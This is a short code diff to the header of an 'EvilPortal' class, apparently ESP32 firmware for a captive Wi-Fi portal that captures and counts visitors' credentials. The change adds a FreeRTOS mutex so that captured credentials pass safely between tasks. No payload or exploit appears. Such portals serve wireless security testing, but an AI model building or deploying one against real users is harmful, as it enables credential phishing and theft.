@@ -5,6 +5,8 @@
 #include <ESPAsyncWebServer.h>
 #include <globals.h>
 #include <WiFiType.h>
+#include <freertos/FreeRTOS.h>
+#include <freertos/semphr.h>
 
 class EvilPortal {
     class CaptiveRequestHandler : public AsyncWebHandler {
@@ -72,9 +74,14 @@ private:
     String htmlPage;
     String htmlFileName;
     bool isDefaultHtml = true;
-    FS *fsHtmlFile;
+    FS *fsHtmlFile = nullptr;
 
+    // lastCred is written by the AsyncTCP task (credsController) and read by
+    // the UI task; both must serialise on this mutex.
     String lastCred;
+    SemaphoreHandle_t lastCredMutex = nullptr;
+    void setLastCred(const String &value);
+    String takeLastCred();
     int totalCapturedCredentials = 0;
     int previousTotalCapturedCredentials = -1;
     String capturedCredentialsHtml = "";
